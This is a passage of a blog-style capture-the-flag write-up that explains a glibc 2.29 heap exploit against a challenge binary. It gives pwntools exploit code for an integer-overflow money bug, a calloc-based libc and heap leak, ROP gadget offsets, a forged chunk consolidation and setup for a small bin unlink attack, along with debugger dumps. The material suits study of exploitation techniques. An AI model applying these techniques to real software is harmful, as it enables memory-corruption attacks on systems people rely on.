  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">upgrade</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">super_house</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'5'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
  <span class="n">debug</span><span class="p">([])</span>
</code></pre></div></div>

<p>Initially, we start out with enough money to only purchase a house of maximum size 0x217 (or any subset of that size). This won‚Äôt do us much good, therefore we have to find a way to get infinite money.</p>

<h4 id="get-infinite-money">Get infinite money</h4>

<p>Well it isn‚Äôt <strong><em>really</em></strong> infinite money, but for the purposes of this program it may as well be. We can use the integer overflow bug in the <code class="highlighter-rouge">buy_house</code> function to get a huge amount of money. The bug is shown here:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="c1">// We cannot have fastbin sizes</span>
<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x7F</span> <span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// We must have enough money to buy the house</span>
  <span class="k">if</span> <span class="p">(</span><span class="mi">218</span> <span class="o">*</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="n">money</span> <span class="p">)</span> <span class="c1">// Integer overflow here</span>
  <span class="p">{</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"Price:%lu"</span><span class="p">,</span> <span class="n">money</span><span class="p">);</span>
    <span class="n">write_var</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
    <span class="n">houses</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">price</span> <span class="o">=</span> <span class="n">size</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="c1">// Price set to a fraction of cost</span>
<span class="p">...</span>
</code></pre></div></div>

<p>If we pass in a size large enough such that <code class="highlighter-rouge">218 * size</code> wraps around to 0, the second <strong>if</strong> check will pass, which will set the house‚Äôs price to a VERY large number. Of course, the <code class="highlighter-rouge">calloc</code> afterwards will most definitely fail, but the program will still continue running due to the error checking in this function, and the sell price of the house will have still been set to a very large number.</p>

<p>Recall that when we sell a house, the only sanity check it performs is that the index is within range. If we manage to get a house‚Äôs price set to that very large number, we can immediately sell it and be given back the money, hence giving us a huge amount of money.</p>

<p>We utilize the integer overflow bug as follows to get infinite money:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_money</span><span class="p">():</span>
  <span class="c1"># Cause the integer overflow
</span>  <span class="n">payload</span> <span class="o">=</span> <span class="p">((</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="mi">218</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

  <span class="c1"># Sell the house for infinite money
</span>  <span class="n">sell</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">get_money</span><span class="p">()</span>
</code></pre></div></div>

<p>Now we can buy as many houses as we‚Äôd like!</p>

<h4 id="getting-libc-and-heap-leaks">Getting libc and heap leaks</h4>

<p><strong>Balsn</strong> used a technique that I had never seen before to get the required leaks.</p>

<p>You can actually force <code class="highlighter-rouge">calloc</code> to return memory that is <strong><em>not</em></strong> zeroed out. It utilizes the following code in <code class="highlighter-rouge">__libc_calloc</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Don't zero out memory if the chunk's IS_MMAPPED bit is set</span>
<span class="k">if</span> <span class="p">(</span><span class="n">chunk_is_mmapped</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span>
<span class="p">{</span>
  <span class="c1">// Used for debugging purposes, ignored</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">perturb_byte</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">memset</span> <span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">mem</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Knowing this, in order to leak both libc and heap addresses, we need to do the following:</p>

<ol>
  <li>Free a large chunk into the unsorted bin. Call it chunk B.</li>
  <li>Allocate another chunk in order to move chunk B from the unsorted bin into a large bin. This will populate the chunk‚Äôs <code class="highlighter-rouge">fd_nextsize</code> and <code class="highlighter-rouge">bk_nextsize</code> fields with heap addresses. It‚Äôs <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> fields will contain libc addresses.</li>
  <li>Use the first upgrade to overflow into chunk B‚Äôs size, and flip the <code class="highlighter-rouge">IS_MMAPPED</code> bit to set it to 1.</li>
  <li>Buy a house that is the exact size of chunk B, and <code class="highlighter-rouge">calloc</code> will give you back chunk B without zeroing it out.</li>
</ol>

<p>Since the <code class="highlighter-rouge">show_house</code> function uses <code class="highlighter-rouge">write</code> to write out <code class="highlighter-rouge">house[index].size</code> bytes of the house‚Äôs description, it will not stop at NULL bytes, which lets us leak both a libc address (from either the <code class="highlighter-rouge">fd</code> or <code class="highlighter-rouge">bk</code> fields) and a heap address (from either the <code class="highlighter-rouge">fd_nextsize</code> or <code class="highlighter-rouge">bk_nextsize</code> fields).</p>

<p>The steps are shown below in my exploit script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Used to overwrite into chunk B
</span><span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x500</span><span class="p">)</span> <span class="c1"># Chunk B
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Prevent consolidation of chunk B with top chunk
</span>
<span class="c1"># Sell chunk B into unsorted bin
</span><span class="n">sell</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x600</span><span class="p">)</span> <span class="c1"># Move chunk B to large bin
</span>
<span class="c1"># Overflow to turn on the IS_MMAPPED bit of chunk B
# This prevents calloc from clearing the chunk when we reallocate it
</span><span class="n">upgrade</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x513</span><span class="p">))</span>

<span class="c1"># Get chunk B back without it being zeroed out
</span><span class="n">buy</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1"># Leak libc and heap addresses
</span><span class="n">show</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x1e50d0</span> <span class="c1"># Leak from bk
</span><span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x2e0</span> <span class="c1"># Leak from fd_nextsize
</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x26542</span>
<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x26f9e</span>
<span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x12bda6</span>
<span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x47cf8</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xcf6c5</span>
<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
<span class="n">leave_ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x58373</span>
</code></pre></div></div>

<p>With the leaks, we can move on to the final stage of the exploit.</p>

<h4 id="rop-on-the-heap">ROP on the heap!?</h4>

<p>This is where the exploit is truly amazing in my opinion. <strong>Balsn</strong> makes use of a number of techniques to set up the heap before finally overwriting <code class="highlighter-rouge">__malloc_hook</code> with a <code class="highlighter-rouge">leave; ret</code> gadget, which pivots the stack onto the heap and returns into a ROP chain that was put onto the heap. This stack pivot <strong><em>only</em></strong> happens when <code class="highlighter-rouge">__malloc_hook</code> is called through <code class="highlighter-rouge">calloc</code>. It is really freaking cool.</p>

<p>The important thing to note here is this: <code class="highlighter-rouge">buy_house</code> uses <code class="highlighter-rouge">calloc</code> to allocate memory for each house‚Äôs description. <code class="highlighter-rouge">calloc</code> <strong><em>DOES NOT</em></strong> use the tcache. This means that any chunks we free into the tcache cannot be used. A classic tcache poisoning attack especially cannot be used since we are only allowed <strong><em>one</em></strong> <code class="highlighter-rouge">malloc</code> in the entire program (<code class="highlighter-rouge">buy_super_house</code>).</p>

<p>Initially, the indexes 0, 1, and 2 are cleared so they can be reused (remember that we have a max limit of 8 houses):</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Clear indexes 0, 1, and 2
</span><span class="n">sell</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># goes into tcache 0x80
</span><span class="n">sell</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># merges with top chunk
</span><span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># goes into tcache 0x80
</span></code></pre></div></div>

<p><strong>Balsn</strong> then chooses to do a fake backwards consolidation of the top chunk. This lets them have a fake 0x6c1 sized chunk which they later use to overwrite the <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> pointers of a smallbin chunk to perform a small bin unlink attack.</p>

<p>I will explain the unlink attack later, but right now, let‚Äôs look at how the top chunk backwards consolidation takes place.</p>

<p>Initially, a 0x80 sized chunk is created with a fake 0x231 chunk header inside it. This 0x230 sized chunk is what we consolidate a 0x600 sized chunk back to. This 0x600 chunk will border the top chunk, which will finally cause the top chunk to consolidate all the way back to the 0x230 sized chunk.</p>

<p>In order to perform the initial backwards consolidation however, there are a number of checks we have to bypass. The checks are shown below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span> <span class="nf">_int_malloc</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>
  <span class="cm">/* consolidate backward */</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">prevsize</span> <span class="o">=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
    <span class="n">size</span> <span class="o">+=</span> <span class="n">prevsize</span><span class="p">;</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span> <span class="n">prevsize</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prevsize</span><span class="p">))</span>
      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted size vs. prev_size while consolidating"</span><span class="p">);</span>
    <span class="n">unlink_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="p">...</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">unlink_chunk</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">next_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">)))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted size vs. prev_size"</span><span class="p">);</span>

  <span class="n">mchunkptr</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
  <span class="n">mchunkptr</span> <span class="n">bk</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted double-linked list"</span><span class="p">);</span>

  <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bk</span><span class="p">;</span>
  <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="p">...</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>A new check has been added in glibc 2.29. It is shown in <code class="highlighter-rouge">_int_malloc</code>. The <code class="highlighter-rouge">prev_size</code> of the chunk we are freeing must match the size of the chunk that we are consolidating back onto. This means that since our fake chunk‚Äôs size is 0x230, we must put the consolidating chunk 0x230 bytes after our fake chunk, otherwise the consolidation will fail at this check.</p>

<p>Next, we have to bypass the <code class="highlighter-rouge">fd-&gt;bk != p || bk-&gt;fd != p</code> check. We can inspect the fake 0x230 sized chunk in GDB and know for a fact that this fake chunk will be at <code class="highlighter-rouge">heapbase+0x890</code>. Knowing this, we can forge the <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> fields as follows to be able to bypass this check:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Create a fake 0x230 sized chunk within a new chunk
# The target address is used to pass the unlink_chunk checks in libc 2.29
</span><span class="n">target</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x890</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x231</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
</code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x55b0b1fb9880</span>
<span class="mh">0x55b0b1fb9880</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000091</span> <span class="o">&lt;-</span> <span class="n">p</span>
<span class="mh">0x55b0b1fb9890</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000231</span> <span class="o">&lt;-</span> <span class="n">fake</span> <span class="n">chunk</span>
<span class="mh">0x55b0b1fb98a0</span><span class="o">:</span> <span class="mh">0x000055b0b1fb9898</span>      <span class="mh">0x000055b0b1fb98a0</span> <span class="o">&lt;-</span> <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">p</span>
<span class="mh">0x55b0b1fb98b0</span><span class="o">:</span> <span class="mh">0x000055b0b1fb9890</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x55b0b1fb98c0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<p>We don‚Äôt have to bypass the checks in the <code class="highlighter-rouge">if (!in_smallbin_range ...)</code> block since <code class="highlighter-rouge">in_smallbin_range</code> will compare the chunk‚Äôs size to 0x3ff, and our chunk‚Äôs size is only 0x230, putting it inside the small bin range.</p>

<p>Next, <strong>Balsn</strong> creates three 0x80 chunks followed by a 0x600 sized chunk. The three 0x80 chunks make it so that the gap between the fake 0x230 sized chunk and the 0x600 sized chunk is exactly 0x230 bytes, which is required for the backwards consolidation check to pass. Following that, the second and last upgrade is used to overwrite the 0x600 chunk‚Äôs size header to 0x610 (to switch off the <code class="highlighter-rouge">PREV_INUSE</code> bit), as well as change its <code class="highlighter-rouge">prev_size</code> to 0x230:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Create enough chunks to create a 0x230 sized gap between the fake 0x230 chunk above
# and the 0x600 sized chunk below that we will consolidate backwards
</span><span class="n">buy</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'D'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>

<span class="c1"># This chunk will be freed to consolidate backwards
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x600</span><span class="p">)</span>

<span class="c1"># Set prev size to go back to the fake 0x230 chunk
# Clear prev inuse bit of the 0x600 sized chunk
</span><span class="n">upgrade</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x80</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x230</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x610</span><span class="p">))</span>
</code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">100</span><span class="n">gx</span> <span class="mh">0x561433a1c880</span>
<span class="mh">0x561433a1c880</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000091</span>
<span class="mh">0x561433a1c890</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000231</span>
<span class="mh">0x561433a1c8a0</span><span class="o">:</span> <span class="mh">0x0000561433a1c898</span>      <span class="mh">0x0000561433a1c8a0</span>
<span class="mh">0x561433a1c8b0</span><span class="o">:</span> <span class="mh">0x0000561433a1c890</span>      <span class="mh">0x0000000000000000</span>
<span class="p">...</span>
<span class="mh">0x561433a1cab0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x561433a1cac0</span><span class="o">:</span> <span class="mh">0x0000000000000230</span>      <span class="mh">0x0000000000000610</span> <span class="o">&lt;-</span> <span class="mh">0x600</span> <span class="n">sized</span> <span class="n">chunk</span>
<span class="mh">0x561433a1cad0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<p>Freeing the 0x600 chunk now will first consolidate the 0x600 chunk back onto the 0x230 chunk and insert it into the unsorted bin. Then, since the top chunk borders this free chunk, the top chunk will also be consolidated backwards onto it:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 0x600 chunk will now be freed and consolidated back to the fake 0x230 sized chunk
# Top chunk is right after this, so top chunk is consolidated all the way back too
</span><span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x5595bf50f880</span>
<span class="mh">0x5595bf50f880</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000091</span>
<span class="mh">0x5595bf50f890</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000020771</span> <span class="o">&lt;-</span> <span class="n">new</span> <span class="n">top</span> <span class="n">chunk</span>
<span class="mh">0x5595bf50f8a0</span><span class="o">:</span> <span class="mh">0x00005595bf50f898</span>      <span class="mh">0x00005595bf50f8a0</span>
<span class="mh">0x5595bf50f8b0</span><span class="o">:</span> <span class="mh">0x00005595bf50f898</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x5595bf50f8c0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<p>Now, I said initially that <strong>Balsn</strong> does a small bin unlink attack. They use this attack to get a chunk inside the <code class="highlighter-rouge">tcache_perthread_struct</code>. In order the pass the checks when unlinking, the 0x20 and 0x30 tcache bins must have pointers in them that point to chunks whose <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> must be under our control.</p>

<p>If you look above, before we freed the 0x600 chunk and consolidated it backwards, we created three 0x80 sized chunks in indexes 5, 0, and 1. <strong>Balsn</strong> now creates a 0x500 sized chunk and does the following:</p>

<ol>
  <li>Insert a 0x6c1 sized fake chunk. Index 5 from above will point to this chunk.</li>
  <li>Insert a 0x31 sized fake chunk. Index 0 from above will point to this chunk.</li>
  <li>Insert a 0x21 sized fake chunk. Index 1 from above will point to this chunk.</li>
  <li>Free the 0x20 and 0x30 sized chunks to populate their corresponding tcache bins in the <code class="highlighter-rouge">tcache_perthread_struct</code>.</li>
  <li>Finally, free the 0x500 sized chunk to consolidate the top chunk back again. Now, with any new allocations we make, we are able to control the metadata of those chunks. The important bit is that we‚Äôve inserted them as pointers into the <code class="highlighter-rouge">tcache_perthread_struct</code>.</li>
</ol>

<p>This step is extremely important for the next part of the exploit. I will refer back to here when needed.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Index 5 will be the 0x6c1 sized fake chunk in the payload
# Index 0 will be the 0x31 sized chunk
# Index 1 will be the 0x21 sized chunk
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x78</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6c1</span><span class="p">)</span> <span class="c1"># Index 5
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="c1"># Index 0
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c1"># Index 1
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">15</span>
<span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># We put pointers to these chunks into the tcache_perthread_struct now
# This is required later when we do the small bin unlink attack
</span><span class="n">sell</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Free 0x30 sized chunk
</span><span class="n">sell</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Free 0x20 sized chunk
</span>
<span class="c1"># Consolidate backwards again
# Any new allocations following this will allow us to overwrite the metadata of any
# of the chunks from above
</span><span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div></div>

<p>The <code class="highlighter-rouge">tcache_perthread_struct</code> can be seen with the pointers to the 0x20 and 0x30 sized chunks as follows:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x562a666cd000</span>
